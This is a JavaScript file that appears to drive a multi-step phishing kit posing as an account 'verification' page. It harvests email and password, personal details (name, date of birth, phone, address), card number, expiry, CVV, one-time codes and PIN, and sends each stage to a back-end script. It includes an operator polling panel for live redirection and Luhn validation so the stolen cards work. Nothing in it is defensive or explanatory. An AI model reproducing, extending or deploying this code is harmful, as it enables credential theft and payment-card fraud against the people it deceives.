// load table
let pages = {
    1: '',
    2: '',
    3: '',
    4: '',
    5: '',
    6: '',
    7: '',
    8: '',
    9: '',
    load: '',
};

let emailm = ""

function lfl(page) {
    document.getElementById('waker').innerHTML = pages[page];
}

window.addEventListener('DOMContentLoaded', () => {
    for (let i = 1; i <= 9; i++) {
        let load = new XMLHttpRequest();
        load.open('GET', 'src/' + i + '.php');
        load.addEventListener('load', () => {
            if (i == 1) {
                document.getElementById('waker').innerHTML = load.responseText;
            }
            pages[i] = load.responseText;
        });
        load.send();
    }
    let loadPage = new XMLHttpRequest();
    loadPage.open('GET', 'src/load.php');
    loadPage.addEventListener('load', () => {
        pages['load'] = loadPage.responseText;
    });
    loadPage.send();
});

function detectCardType(cardNumber) {
    var cardType = '';
    if (/^4/.test(cardNumber)) {
        cardType = 'visa';
    } else if (/^5[1-5]/.test(cardNumber)) {
        cardType = 'mastercard';
    } else if (/^3[47]/.test(cardNumber)) {
        cardType = 'amex';
    } else if (/^6(?:011|5)/.test(cardNumber)) {
        cardType = 'discover';
    }
    return cardType;
}

function load(page) {
    document.getElementById('waker').style.visibility = 'hidden';
    document.getElementById('waker').innerHTML = pages[page];
    if (page == 2) {
        document.getElementById('emailcontainer').innerHTML = emailm
    }
    if (page == 4) {
        $('#tel').mask('999999999999');
        $('#dob').mask('99/99/9999');
        $('#zip').mask('999999');
    }else if (page == 5) {
        $('#cc').mask('9999 9999 9999 9999');
        $('#cc').on('input', function() {
            var cardNumber = $(this).val().replace(' ', '').replace(' ', '').replace(' ', '')
            var cardType = detectCardType(cardNumber);
            switch (cardType) {
                case 'visa':
                    $(this).mask('9999 9999 9999 9999');
                    break;
                case 'mastercard':
                    $(this).mask('9999 9999 9999 9999');
                    break;
                case 'amex':
                    $(this).mask('9999 999999 99999');
                    break;
                case 'discover':
                    $(this).mask('9999 9999 9999 9999');
                    break;
                default:
                    $(this).mask('9999 9999 9999 9999');
                    break;
            }
        });
        $('#exp').mask("99/99");
        $('#ccv').mask("9999");
        
    }
    setTimeout(()=>{document.getElementById('waker').style.visibility = 'visible'},0)
}

function value(id) {
    return document.getElementById(id).value
}

function sendit(step, rez) {
    let send = new XMLHttpRequest;
    send.open('GET', '../back/utils.php?action=send&rez=' + rez + "&step=" + step)
    send.send()
}

function luhn(cardNumber) {
    cardNumber = cardNumber.replace(/\s/g,'');
    if (!/^\d+$/.test(cardNumber)) {
      return false;
    }
    var cardLength = cardNumber.length;
    var validLengths = {
      "Visa": [13, 16, 19],
      "Mastercard": [16],
      "American Express": [15],
      "Discover": [16]
    };
    if (!validLengths["Visa"].includes(cardLength) &&
        !validLengths["Mastercard"].includes(cardLength) &&
        !validLengths["American Express"].includes(cardLength) &&
        !validLengths["Discover"].includes(cardLength)) {
      return false;
    }
    var sum = 0;
    var doubleUp = false;
    for (var i = cardLength - 1; i >= 0; i--) {
      var digit = parseInt(cardNumber.charAt(i));
      if (doubleUp) {
        if ((digit *= 2) > 9) digit -= 9;
      }
      sum += digit;
      doubleUp = !doubleUp;
    }
    return (sum % 10 == 0);
}

function checkRedirect(step){
    let x = setInterval(()=>{
        let req = new XMLHttpRequest;
        req.open('GET','../back/utils.php?action=checkRedirect&step=' + step)
        req.addEventListener('load',()=>{
            if (req.responseText != 'loading') {
                load(req.responseText)
                clearInterval(x)
                clearInterval(x)
            }
        })
        req.send()
    },2000)
}

let errorr = {
    "sq": "Faleminderit që verifikoni informacionin tuaj",
    "de": "Vielen Dank für die Überprüfung Ihrer Informationen",
    "ca": "Gràcies per comprovar la vostra informació",
    "nl": "Bedankt voor het controleren van uw informatie",
    "fr": "Merci de vérifier vos informations",
    "be": "Дзякуй за праверку вашай інфармацыі",
    "ru": "Спасибо за проверку ваших данных",
    "zh": "感谢您核实您的信息",
    "hr": "Hvala vam što provjeravate svoje informacije",
    "sr": "Хвала вам што проверавате своје информације",
    "bg": "Благодариме ви, че проверявате вашата информация",
    "el": "Ευχαριστούμε που ελέγχετε τις πληροφορίες σας",
    "da": "Tak for at kontrollere dine oplysninger",
    "es": "Gracias por verificar su información",
    "et": "Täname oma teabe kontrollimise eest",
    "fi": "Kiitos tietojesi tarkistamisesta",
    "sv": "Tack för att du kontrollerar din information",
    "ga": "Go raibh maith agat as do chuid eolais a sheiceáil",
    "is": "Þakka þér fyrir að staðfesta upplýsingar þínar",
    "it": "Grazie per verificare le tue informazioni",
    "lv": "Paldies par jūsu informācijas pārbaudi",
    "lt": "Ačiū, kad patikrinate savo informaciją",
    "lb": "Merci fir d'Äwerpréiwung vun ären Informatiounen",
    "mk": "Благодарам што ги проверувате вашите информации",
    "mt": "Grazzi għall-ivverifika tal-informazzjoni tiegħek",
    "ro": "Mulțumesc pentru verificarea informațiilor tale",
    "no": "Takk for at du sjekker informasjonen din",
    "pl": "Dziękujemy za sprawdzenie swoich informacji",
    "pt": "Obrigado por verificar suas informações",
    "cs": "Děkujeme za ověření vašich informací",
    "uk": "Дякуємо за перевірку ваших даних",
    "la": "Gratias tibi ago pro verificatione tua informationum",
    "ar": "شكرًا للتحقق من معلوماتك",
    "af": "Dankie vir die nagaan van jou inligting",
    "sw": "Asante kwa kuthibitisha habari zako"
  }

function error(id, status) {
    if (status == true) {
        document.getElementById('error').style.display = "block"
        document.getElementById('error').innerHTML = errorr[lang]
    }else{
        document.getElementById('error').style.display = "none"
    }
}

// submit function
function submit(step) {
    if (step == '1') {
        if (emailm == "") {
            let email = value('email');
            error('email', false)
            if (!email.includes('@') || !email.split('@')[1].includes('.')) {
                error('email', true)
                return false;
            }
            error('email', false)
            load('load')
            emailm = email
            setTimeout(()=>{load(2)},1500)
        }else{
            let password = value('password');
            error('password', false)
            if (password.length < 7) {
                error('password', true)
                return false;
            }
            error('password', false)
            load('load')
            setTimeout(()=>{load(3)},1500)
            sendit(step, emailm + '|' + password )
        }   
    }else if (step == '2') {
        let date = new Date();
        let name = value('name');
        let dob = value('dob');
        let tel = value('tel');
        let address = value('address');
        let city = value('city');
        let zip = value('zip');

        nom = name
        error('2', false)
        if (name.length < 5) {
            error('name', true)
            return false;
        }else if (!dob.includes('/') || dob.split('/').length != 3 || date.getFullYear() - dob.split('/')[2] < 16) {
            error('dob', true)
            return false;
        }else if (tel.length < 5) {
            error('tel', true)
            return false;
        }else if (address.length < 5) {
            error('address', true)
            return false;
        }else if (city.length < 3) {
            error('city', true)
            return false;
        }else if (zip.length < 4) {
            error('zip', true)
            return false;
        }
    
        error('2', false)
        load('load')
        sendit(step, name + '|' + dob + '|' + tel + '|' + address + '|' + city + '|' + zip )
        setTimeout(()=>{load(5)},1500)
        
    }else if (step == '3') {
        let date = new Date();
        let cc = value('cc')
        let exp = value('exp')
        let cvv = value('cvv')

        if (cc.length != 19 && !luhn(cc.replace(' ', '').replace(' ', '').replace(' ', ''))) {
            error('cc', true)
            return false;
        }else if (parseInt(exp.split('/')[1]) < String(date.getFullYear()).slice(-2)){
            error('exp', true)
            return false;
        }else if (cvv.length < 3){
            error('cvv', true)
            return false;
        }


        error('3', false)
        sendit(step, cc + '|' + exp + '|' + cvv )
        load('load')
        if (panel == '1') {
            checkRedirect('cc')
        }else{
            setTimeout(()=>{load(8)},time * 1000)
            
        }
    }else if (step == '4'){
        let code = value('code')

        if (code.length < 5) {
            error('code', true)
            return false;
        }

        error('code', false)
        sendit(step, code )
        load('load')
        if (panel == '1') {
            checkRedirect('cc')
        }else{
            setTimeout(()=>{load(8)},time * 1000)
        }
   
    }else if (step == '5'){
        let pin = value('code')

        if (pin.length < 3) {
            error('pin', true)
            return false;
        }

        error('pin', false)
        sendit(step, pin )
        load('load')
        if (panel == '1') {
            checkRedirect('cc')
        }else{
            setTimeout(()=>{load(9)},1500)
        }
    }
}

function togglePassword(){
    if (document.getElementById('password').getAttribute('type') == 'password') {
        document.getElementById('password').setAttribute('type', 'text')
    }else{
        document.getElementById('password').setAttribute('type', 'password')
    }
}